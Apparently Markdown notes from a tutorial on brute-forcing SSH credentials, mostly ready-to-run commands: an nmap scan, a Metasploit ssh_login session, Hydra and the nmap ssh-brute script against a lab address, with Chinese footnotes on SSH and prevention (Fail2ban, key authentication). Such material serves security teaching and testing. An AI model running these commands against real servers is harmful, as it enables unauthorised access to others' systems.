## Gain SSH Access to Servers by Brute-Forcing Credentials

### Overview of SSH [^1]

### Scan with Nmap

`nmap 192.168.1.110 -p 22`

### Metasploit

```bash
service postgresql start
apt-get update && apt-get dist-upgrade
msfconsole
search ssh
use auxiliary/scanner/ssh/ssh_login
options
set rhosts 192.168.1.110
set stop_on_success true
set user_file users.txt
set pass_file pass.txt
set verbose true
run
sessions
sessions -i 1
```

### Hydra

`hydra -L users.txt -P pass.txt ssh://192.168.1.110:22 -t 4`

### Nmap Scripting Engine

`nmap 192.168.1.110 -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=pass.txt`

### How to Prevent SSH Brute-Forcing [^2]



[原文](https://null-byte.wonderhowto.com/how-to/gain-ssh-access-servers-by-brute-forcing-credentials-0194263/)

---

[^1]: SSH代表Secure Shell，是一种[网络协议](https://null-byte.wonderhowto.com/how-to/networking-basics/)，允许通过不安全的网络进行加密通信。SSH加密网络协议在客户端 - 服务器模型上运行，即客户端启动与服务器的连接，并在进行身份验证后建立通信。SSH可以使用密码和[私钥](https://null-byte.wonderhowto.com/how-to/generate-private-encryption-keys-with-diffie-hellman-key-exchange-0180269/)验证，后者被认为更安全。
[^2]: 使用[Fail2ban](https://www.fail2ban.org/wiki/index.php/Main_Page)，[DenyHosts](http://denyhosts.sourceforge.net/)或[iptables](https://linux.die.net/man/8/iptables)这样的服务来阻止主机级别的暴力尝试。或者使用私钥验证和密码相结合，使您远离大多数攻击。如果必须需要基于密码的身份验证，请使用强密码并遵循[最佳做法](https://auth0.com/blog/dont-pass-on-the-new-nist-password-guidelines/)。